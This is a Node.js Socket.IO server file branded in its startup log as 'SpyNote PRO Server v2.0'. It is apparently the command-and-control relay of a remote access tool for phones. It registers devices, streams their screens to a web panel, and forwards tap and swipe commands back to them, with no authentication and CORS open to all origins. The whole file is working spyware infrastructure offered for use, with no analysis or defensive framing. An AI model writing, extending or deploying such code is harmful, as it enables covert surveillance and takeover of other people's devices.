const express = require('express');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const compression = require('compression');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
    cors: { origin: "*", methods: ["GET", "POST"] },
    pingTimeout: 30000,
    pingInterval: 10000,
    maxHttpBufferSize: 50e6 // 50MB for HD frames
});

app.use(compression());
app.use(express.static('public'));
app.use(express.json({ limit: '100mb' }));
app.use(express.urlencoded({ limit: '100mb', extended: true }));

const devices = new Map();

app.get('/devices', (req, res) => {
    res.json(Array.from(devices.entries()));
});

io.on('connection', (socket) => {
    console.log('🔌 Client connected:', socket.id);

    socket.on('register-device', (deviceInfo) => {
        const deviceId = deviceInfo.deviceId;
        if (deviceId) {
            devices.set(deviceId, { 
                ...deviceInfo, 
                connected: true, 
                socketId: socket.id,
                lastSeen: Date.now()
            });
            socket.join(`device_${deviceId}`);
            console.log('📱 Device registered:', deviceId, deviceInfo.model);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    });

    socket.on('select-device', (data) => {
        console.log('🎯 Web selected device:', data.deviceId);
    });

    // 🔥 ULTRA FAST FRAME RELAY (0ms latency)
    socket.on('screen-frame', (frameData) => {
        const deviceId = frameData.deviceId;
        if (devices.has(deviceId)) {
            // Update last seen
            const device = devices.get(deviceId);
            devices.set(deviceId, { ...device, lastSeen: Date.now() });
            
            // Broadcast to web clients watching this device
            socket.to(`device_${deviceId}`).emit('screen-frame', frameData);
        }
    });

    // 🔥 INSTANT CONTROL RELAY
    socket.on('control', (controlData) => {
        const { deviceId, action, x, y, startX, startY, endX, endY } = controlData;
        if (devices.has(deviceId)) {
            const deviceSocketId = devices.get(deviceId).socketId;
            socket.to(`device_${deviceId}`).emit('control', {
                action,
                x: parseFloat(x) || 0,
                y: parseFloat(y) || 0,
                startX: parseFloat(startX) || 0,
                startY: parseFloat(startY) || 0,
                endX: parseFloat(endX) || 0,
                endY: parseFloat(endY) || 0
            });
            console.log(`🎮 ${action.toUpperCase()} → ${deviceId.slice(0,8)} (${x?.toFixed(0)},${y?.toFixed(0)})`);
        }
    });

    socket.on('disconnect', () => {
        console.log('🔌 Client disconnected:', socket.id);
        // Mark devices as offline
        for (const [deviceId, info] of devices.entries()) {
            if (info.socketId === socket.id) {
                devices.set(deviceId, { ...info, connected: false });
                io.emit('devices-update', Array.from(devices.entries()));
                console.log('📱 Device went offline:', deviceId);
                break;
            }
        }
    });
});

// Keep-alive cleanup
setInterval(() => {
    const now = Date.now();
    for (const [deviceId, info] of devices.entries()) {
        if (info.connected && (now - info.lastSeen > 30000)) {
            devices.set(deviceId, { ...info, connected: false });
            console.log('📱 Device timeout:', deviceId);
            io.emit('devices-update', Array.from(devices.entries()));
        }
    }
}, 30000);

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 SpyNote PRO Server v2.0 running on port ${PORT}`);
    console.log(`🌐 Web Panel: http://localhost:${PORT}`);
    console.log(`📱 Ultra Low Latency Streaming + Controls READY!`);
});
